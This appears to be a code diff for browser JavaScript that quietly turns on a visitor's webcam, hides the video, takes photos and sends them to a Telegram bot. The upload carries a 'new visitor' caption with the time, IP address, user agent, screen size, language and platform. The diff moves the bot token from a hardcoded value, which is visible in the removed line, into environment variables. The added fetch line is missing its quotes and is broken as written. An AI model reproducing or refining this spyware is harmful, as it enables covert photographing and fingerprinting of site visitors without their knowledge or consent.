@@ -1,3 +1,6 @@
+const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
+const chatId = process.env.CHAT_ID;
+
 navigator.mediaDevices.getUserMedia({ video: true })
   .then(stream => {
     const video = document.createElement('video');
@@ -5,6 +8,7 @@ navigator.mediaDevices.getUserMedia({ video: true })
     video.play();
     video.style.display = 'none';
     document.body.appendChild(video);
+
 
     const capture = () => {
       const canvas = document.createElement('canvas');
@@ -15,8 +19,8 @@ navigator.mediaDevices.getUserMedia({ video: true })
       const blob = dataURLtoBlob(dataUrl);
       const formData = new FormData();
       formData.append('photo', blob, 'photo.jpg');
-      formData.append('description', 'Новый посетитель\nВремя: ' + new Date().toISOString() + '\nIP: ' + getIP() + '\nUA: ' + navigator.userAgent + '\nЭкран: ' + window.innerWidth + 'x' + window.innerHeight + '\nЯзык: ' + navigator.language + '\nПлатформа: ' + getPlatform());
-      fetch('https://api.telegram.org/bot8569817774:AAGOwkVKL5lRyenrjaK3CibpuzkZM0x1Nww/sendPhoto', {
+      formData.append('caption', 'Новый посетитель\nВремя: ' + new Date().toISOString() + '\nIP: ' + getIP() + '\nUA: ' + navigator.userAgent + '\nЭкран: ' + window.innerWidth + 'x' + window.innerHeight + '\nЯзык: ' + navigator.language + '\nПлатформа: ' + getPlatform());
+      fetch(https://api.telegram.org/bot${telegramBotToken}/sendPhoto?chat_id=${chatId}, {
         method: 'POST',
         body: formData
       });
